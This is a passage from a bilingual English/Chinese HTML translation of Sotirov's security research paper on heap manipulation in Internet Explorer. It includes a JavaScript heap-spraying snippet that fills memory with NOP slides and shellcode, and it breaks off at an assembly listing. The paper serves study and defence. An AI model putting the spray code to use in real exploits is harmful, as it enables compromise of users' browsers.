<html xmlns:v="urn:schemas-microsoft-com:vml"
xmlns:o="urn:schemas-microsoft-com:office:office"
xmlns:w="urn:schemas-microsoft-com:office:word"
xmlns:st1="urn:schemas-microsoft-com:office:smarttags"
xmlns="http://www.w3.org/TR/REC-html40">

<head>
<meta http-equiv=Content-Type content="text/html; charset=utf-8">
<meta name=ProgId content=Word.Document>
<meta name=Generator content="Microsoft Word 11">
<meta name=Originator content="Microsoft Word 11">
<link rel=File-List
href="Heap%20Feng%20Shui%20in%20JavaScript.files/filelist.xml">
<title>Heap Feng Shui in JavaScript</title>
<o:SmartTagType namespaceuri="urn:schemas-microsoft-com:office:smarttags"
 name="chmetcnv"/>
<o:SmartTagType namespaceuri="urn:schemas-microsoft-com:office:smarttags"
 name="place"/>
<!--[if gte mso 9]><xml>
 <o:DocumentProperties>
  <o:Author>xac</o:Author>
  <o:LastAuthor>xac</o:LastAuthor>
  <o:Revision>2</o:Revision>
  <o:TotalTime>625</o:TotalTime>
  <o:Created>2007-11-29T06:47:00Z</o:Created>
  <o:LastSaved>2007-11-29T06:47:00Z</o:LastSaved>
  <o:Pages>1</o:Pages>
  <o:Words>9343</o:Words>
  <o:Characters>53258</o:Characters>
  <o:Company>xac</o:Company>
  <o:Lines>443</o:Lines>
  <o:Paragraphs>124</o:Paragraphs>
  <o:CharactersWithSpaces>62477</o:CharactersWithSpaces>
  <o:Version>11.9999</o:Version>
 </o:DocumentProperties>
</xml><![endif]--><!--[if gte mso 9]><xml>
 <w:WordDocument>
  <w:ValidateAgainstSchemas/>
  <w:SaveIfXMLInvalid>false</w:SaveIfXMLInvalid>
  <w:IgnoreMixedContent>false</w:IgnoreMixedContent>
  <w:AlwaysShowPlaceholderText>false</w:AlwaysShowPlaceholderText>
  <w:Compatibility>
   <w:UseFELayout/>
  </w:Compatibility>
  <w:BrowserLevel>MicrosoftInternetExplorer4</w:BrowserLevel>
 </w:WordDocument>
</xml><![endif]--><!--[if gte mso 9]><xml>
 <w:LatentStyles DefLockedState="false" LatentStyleCount="156">
 </w:LatentStyles>
</xml><![endif]--><!--[if !mso]><object
 classid="clsid:38481807-CA0E-42D2-BF39-B33AF135CC4D" id=ieooui></object>
<style>
st1\:*{behavior:url(#ieooui) }
</style>
<![endif]-->
<style>
<!--
 /* Font Definitions */
 @font-face
	{font-family:Wingdings;
	panose-1:5 0 0 0 0 0 0 0 0 0;
	mso-font-charset:2;
	mso-generic-font-family:auto;
	mso-font-pitch:variable;
	mso-font-signature:0 268435456 0 0 -2147483648 0;}
@font-face
	{font-family:宋体;
	panose-1:2 1 6 0 3 1 1 1 1 1;
	mso-font-alt:SimSun;
	mso-font-charset:134;
	mso-generic-font-family:auto;
	mso-font-pitch:variable;
	mso-font-signature:3 135135232 16 0 262145 0;}
@font-face
	{font-family:Verdana;
	panose-1:2 11 6 4 3 5 4 4 2 4;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-pitch:variable;
	mso-font-signature:536871559 0 0 0 415 0;}
@font-face
	{font-family:"\@宋体";
	panose-1:2 1 6 0 3 1 1 1 1 1;
	mso-font-charset:134;
	mso-generic-font-family:auto;
	mso-font-pitch:variable;
	mso-font-signature:3 135135232 16 0 262145 0;}
 /* Style Definitions */
 p.MsoNormal, li.MsoNormal, div.MsoNormal
	{mso-style-parent:"";
	margin:0cm;
	margin-bottom:.0001pt;
	text-align:left;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:宋体;
	mso-bidi-font-family:宋体;}
h1
	{mso-margin-top-alt:auto;
	margin-right:0cm;
	mso-margin-bottom-alt:auto;
	margin-left:0cm;
	text-align:left;
	mso-pagination:widow-orphan;
	mso-outline-level:1;
	font-size:21.5pt;
	font-family:宋体;
	mso-bidi-font-family:宋体;
	color:#4F628C;
	font-weight:bold;}
h2
	{margin-top:21.6pt;
	margin-right:0cm;
	mso-margin-bottom-alt:auto;
	margin-left:0cm;
	text-align:left;
	mso-pagination:widow-orphan;
	mso-outline-level:2;
	font-size:15.5pt;
	font-family:宋体;
	mso-bidi-font-family:宋体;
	color:#4F628C;
	font-weight:bold;}
h3
	{margin-top:21.6pt;
	margin-right:0cm;
	mso-margin-bottom-alt:auto;
	margin-left:0cm;
	text-align:left;
	mso-pagination:widow-orphan;
	mso-outline-level:3;
	font-size:12.0pt;
	font-family:宋体;
	mso-bidi-font-family:宋体;
	font-weight:bold;}
h4
	{mso-margin-top-alt:auto;
	margin-right:0cm;
	mso-margin-bottom-alt:auto;
	margin-left:0cm;
	text-align:left;
	mso-pagination:widow-orphan;
	mso-outline-level:4;
	font-size:12.0pt;
	font-family:宋体;
	mso-bidi-font-family:宋体;
	font-weight:bold;}
p.MsoCommentText, li.MsoCommentText, div.MsoCommentText
	{mso-style-link:" Char Char2";
	margin:0cm;
	margin-bottom:.0001pt;
	text-align:left;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:宋体;
	mso-bidi-font-family:宋体;}
span.MsoCommentReference
	{mso-ansi-font-size:10.5pt;
	mso-bidi-font-size:10.5pt;}
a:link, span.MsoHyperlink
	{color:#607A9D;
	text-decoration:underline;
	text-underline:single;}
a:visited, span.MsoHyperlinkFollowed
	{color:#607A9D;
	text-decoration:underline;
	text-underline:single;}
p
	{mso-margin-top-alt:auto;
	margin-right:0cm;
	mso-margin-bottom-alt:auto;
	margin-left:0cm;
	text-align:justify;
	text-justify:inter-ideograph;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:宋体;
	mso-bidi-font-family:宋体;}
pre
	{margin:0cm;
	margin-bottom:.0001pt;
	text-align:left;
	mso-pagination:widow-orphan;
	tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt;
	font-size:11.5pt;
	font-family:"Courier New";
	mso-fareast-font-family:宋体;}
span.code
	{mso-style-name:code;
	mso-ansi-font-size:11.5pt;
	mso-bidi-font-size:11.5pt;
	font-family:"Courier New";
	mso-ascii-font-family:"Courier New";
	mso-hansi-font-family:"Courier New";
	mso-bidi-font-family:"Courier New";}
span.CharChar2
	{mso-style-name:" Char Char2";
	mso-style-locked:yes;
	mso-style-link:批注文字;
	mso-ansi-font-size:12.0pt;
	mso-bidi-font-size:12.0pt;
	font-family:宋体;
	mso-ascii-font-family:宋体;
	mso-fareast-font-family:宋体;
	mso-hansi-font-family:宋体;
	mso-bidi-font-family:宋体;
	mso-ansi-language:EN-US;
	mso-fareast-language:ZH-CN;
	mso-bidi-language:AR-SA;}
@page Section1
	{size:595.3pt 841.9pt;
	margin:72.0pt 90.0pt 72.0pt 90.0pt;
	mso-header-margin:42.55pt;
	mso-footer-margin:49.6pt;
	mso-paper-source:0;}
div.Section1
	{page:Section1;}
 /* List Definitions */
 @list l0
	{mso-list-id:21440930;
	mso-list-template-ids:-652967982;}
@list l0:level1
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l1
	{mso-list-id:435517422;
	mso-list-template-ids:-2101942338;}
@list l1:level1
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l2
	{mso-list-id:488248266;
	mso-list-template-ids:1166068942;}
@list l2:level1
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l3
	{mso-list-id:738133219;
	mso-list-template-ids:795354636;}
@list l3:level1
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l4
	{mso-list-id:894007535;
	mso-list-template-ids:1876051428;}
@list l4:level1
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l5
	{mso-list-id:1022511789;
	mso-list-template-ids:555528576;}
@list l5:level1
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l6
	{mso-list-id:1028796465;
	mso-list-template-ids:461304518;}
@list l6:level1
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l7
	{mso-list-id:1145270123;
	mso-list-template-ids:1001707010;}
@list l7:level1
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l8
	{mso-list-id:1191648579;
	mso-list-template-ids:-1714019034;}
@list l8:level1
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l9
	{mso-list-id:1201356600;
	mso-list-template-ids:237000944;}
@list l9:level1
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l10
	{mso-list-id:1276867103;
	mso-list-template-ids:-1578042544;}
@list l10:level1
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l11
	{mso-list-id:1386566818;
	mso-list-template-ids:130078008;}
@list l11:level1
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l12
	{mso-list-id:1494295047;
	mso-list-template-ids:749391910;}
@list l12:level1
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l13
	{mso-list-id:1697267819;
	mso-list-template-ids:749005256;}
@list l13:level1
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l14
	{mso-list-id:1968663098;
	mso-list-template-ids:388779418;}
@list l14:level1
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l15
	{mso-list-id:1979072283;
	mso-list-template-ids:1188490254;}
@list l15:level1
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l16
	{mso-list-id:2083139726;
	mso-list-template-ids:141957968;}
@list l16:level1
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
ol
	{margin-bottom:0cm;}
ul
	{margin-bottom:0cm;}
-->
</style>
<!--[if gte mso 10]>
<style>
 /* Style Definitions */
 table.MsoNormalTable
	{mso-style-name:普通表格;
	mso-tstyle-rowband-size:0;
	mso-tstyle-colband-size:0;
	mso-style-noshow:yes;
	mso-style-parent:"";
	mso-padding-alt:0cm 5.4pt 0cm 5.4pt;
	mso-para-margin:0cm;
	mso-para-margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:10.0pt;
	font-family:"Times New Roman";
	mso-ansi-language:#0400;
	mso-fareast-language:#0400;
	mso-bidi-language:#0400;}
</style>
<![endif]--><!--[if gte mso 9]><xml>
 <o:shapedefaults v:ext="edit" spidmax="2050"/>
</xml><![endif]--><!--[if gte mso 9]><xml>
 <o:shapelayout v:ext="edit">
  <o:idmap v:ext="edit" data="1"/>
 </o:shapelayout></xml><![endif]-->
</head>

<body bgcolor=white lang=ZH-CN link="#607A9D" vlink="#607A9D" style='tab-interval:
21.0pt'>

<div class=Section1>

<h1><span lang=EN-US style='font-size:17.0pt;font-family:Verdana'>Heap Feng
Shui in JavaScript<o:p></o:p></span></h1>

<h1><span lang=EN-US style='font-size:17.0pt;font-family:Verdana'>JavaScript</span><span
style='font-size:17.0pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>中的堆风水</span><span lang=EN-US style='font-size:17.0pt;font-family:Verdana'><o:p></o:p></span></h1>

<p style='margin-top:5.0pt;margin-right:0cm;margin-bottom:30.0pt;margin-left:
24.0pt'><span style='font-size:11.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>作者：</span><span lang=EN-US style='font-size:11.5pt;
font-family:Verdana;color:#404040'>Alexander Sotirov <a
href="mailto:asotirov@determina.com">asotirov@determina.com</a><o:p></o:p></span></p>

<p style='margin-top:5.0pt;margin-right:0cm;margin-bottom:30.0pt;margin-left:
24.0pt'><span style='font-size:11.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>译者：</span><span lang=EN-US style='font-size:11.5pt;
font-family:Verdana;color:#404040'><a href="mailto:Hannibal509@gmail.com">Hannibal509@gmail.com</a><o:p></o:p></span></p>

<p style='margin-top:5.0pt;margin-right:0cm;margin-bottom:30.0pt;margin-left:
24.0pt'><span style='font-size:11.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>审校：</span><span lang=EN-US style='font-size:11.5pt;
font-family:Verdana;color:#404040'><a href="mailto:wooshi@gmail.com">wooshi@gmail.com</a><o:p></o:p></span></p>

<h2><span lang=EN-US style='font-size:12.5pt;font-family:Verdana'>Introduction<o:p></o:p></span></h2>

<h2><span style='font-size:12.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>导言</span><span lang=EN-US style='font-size:12.5pt;font-family:Verdana'><o:p></o:p></span></h2>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
exploitation of heap corruption vulnerabilities on the Windows platform has
become increasingly more difficult since the introduction of XP SP2. Heap
protection features such as safe unlinking and heap cookies have been successful
in stopping most generic heap exploitation techniques. Methods for bypassing
the heap protection exist, but they require a great degree of control over the
allocation patterns of the vulnerable application.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>自从</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>WindowsXP SP2</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>发布之后，</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Windows</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>平台上的堆腐烂</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>/</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>堆破坏（</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>heap
corruption</span><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;
mso-hansi-font-family:Verdana;color:#404040'>，本文中统一采用堆腐烂的译法）漏洞的利用难度是越来越高了。由于微软在堆中加入了诸如“</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>safe
unlink</span><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;
mso-hansi-font-family:Verdana;color:#404040'>”以及“</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>cookies</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>”的堆保护功能，大多数传统的堆腐烂的利用技术几乎在一夜之间就全部败下阵来。当然，能绕过这些堆保护机制的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>exploit</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>技术也不是没有，但是这些技术都需要我们能很好的控制存在漏洞的程序中堆分配的参数。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>This
paper introduces a new technique for precise manipulation of the browser heap
layout using specific sequences of JavaScript allocations. We present a
JavaScript library with functions for setting up the heap in a controlled state
before triggering a heap corruption bug. This allows us to exploit very
difficult heap corruption vulnerabilities with great reliability and precision.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>本文介绍了一种全新的技术，它通过在</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>JavaScript</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中执行一系列的堆分配和释放操作，精确的控制了浏览器的堆。另外我还提供了一个完成上述功能的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>JavaScript</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>函数库，这样我们就能很可靠的，而且很精确的利用一些很难利用的堆腐烂漏洞了。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>We
will focus on Internet Explorer exploitation, but the general techniques
presented here are potentially applicable to any other browser or scripting
environment.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>虽然本文是讨论</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>IE</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>中的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>exploit</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>技术的，但是你也可以把这一技术引伸到其他的浏览器或者脚本执行环境中。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<h2><span lang=EN-US style='font-size:12.5pt;font-family:Verdana'>Previous work<o:p></o:p></span></h2>

<h2><span style='font-size:12.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>预备作业</span><span lang=EN-US style='font-size:12.5pt;font-family:Verdana'><o:p></o:p></span></h2>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
most widely used browser heap exploitation technique is the heap spraying
method developed by <a
href="http://www.edup.tudelft.nl/~bjwever/advisory_iframe.html.php">SkyLined</a>
for his Internet Explorer IFRAME exploit. This technique uses JavaScript to
create multiple strings containing a NOP slide and shellcode. The JavaScript
runtime stores the data for each string in a new block on the heap. Heap allocations
usually start at the beginning of the address space and go up. After allocating
200MB of memory for the strings, any address between 50MB and 200MB is very
likely to point at the NOP slide. Overwriting a return address or a function
pointer with an address in this range will lead to a jump to the NOP slide and
shellcode execution.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>现在最流行的堆</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>exploit</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>技术是</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><a
href="http://www.edup.tudelft.nl/~bjwever/advisory_iframe.html.php">SkyLined</a></span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>为了利用</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>Internet Explorer IFRAME</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>漏洞而开发的堆喷射（</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>heap spraying</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>，本文中采用堆喷射的译法，呵呵比较形象，申请很多内存写上</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>shellcode</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>，有点象用水枪喷水，喷的到处都是水的样子</span><span lang=EN-US
style='font-size:9.5pt;font-family:Wingdings;mso-ascii-font-family:Verdana;
mso-hansi-font-family:Verdana;color:#404040;mso-char-type:symbol;mso-symbol-font-family:
Wingdings'><span style='mso-char-type:symbol;mso-symbol-font-family:Wingdings'>J</span></span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>）技术。这一技术用</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>JavaScript</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>脚本创建了很多个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对象，在</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>string</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>对象中写入一个长长的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>NOP</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>链以及紧接着</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>NOP</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>链的一小段</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>shellcode</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>。</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>JavaScript runtime</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>会把这些</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>string</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>对象都存储在堆中。由于堆中的数据是不断向内存高址增长的。在大约分配了</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>200MB</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的内存给这些</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>string</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>对象之后，在</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>50MB</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>～</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>200MB</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>这段内存中，随意取出一个地址，上面写着的很可能就是</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>NOP</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>链中的一环。把某个返回地址覆盖掉，变成这个随意取出的地址之后，我们就能跳到这个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>NOP</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>链上，最终执行</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>Shellcode</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
following JavaScript code illustrates this technique:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>下面是一段堆喷射技术的</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>JavaScript</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的演示代码：</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>var nop = unescape(&quot;%u9090%u9090&quot;);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>// Create a 1MB string of NOP instructions followed by shellcode:<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>//<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>// malloc header<span style='mso-spacerun:yes'>   </span>string length<span style='mso-spacerun:yes'>   </span>NOP slide<span style='mso-spacerun:yes'>   </span>shellcode<span style='mso-spacerun:yes'>   </span>NULL terminator<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>// 32 bytes<span style='mso-spacerun:yes'>        </span>4 bytes<span style='mso-spacerun:yes'>         </span>x bytes<span style='mso-spacerun:yes'>     </span>y bytes<span style='mso-spacerun:yes'>     </span>2 bytes<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>while (nop.length &lt;= 0x100000/2) nop += nop;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>nop = nop.substring(0, 0x100000/2 - 32/2 - 4/2 - shellcode.length - 2/2);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>var x = new Array();<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>// Fill 200MB of memory with copies of the NOP slide and shellcode<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>for (var i = 0; i &lt; 200; i++) { <o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>x[i] = nop + shellcode;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>}<o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>A
slight variation of this technique can be used to exploit vtable and object
pointer overwrites. If an object pointer is used for a virtual function call,
the compiler generates code similar to the following:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对堆喷射技术的一个小小的改进是我们可以不改写函数的返回地址，而是去改写对象指针或者是对象的虚函数表。如果某个对象中使用了虚函数，那么当我们用这个对象的指针去调用这个对象的虚函数时，编译器一般会生成下面这段代码：</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>mov ecx, dword ptr [eax]<span style='mso-spacerun:yes'>    </span>; get the vtable address<o:p></o:p></span></pre><pre
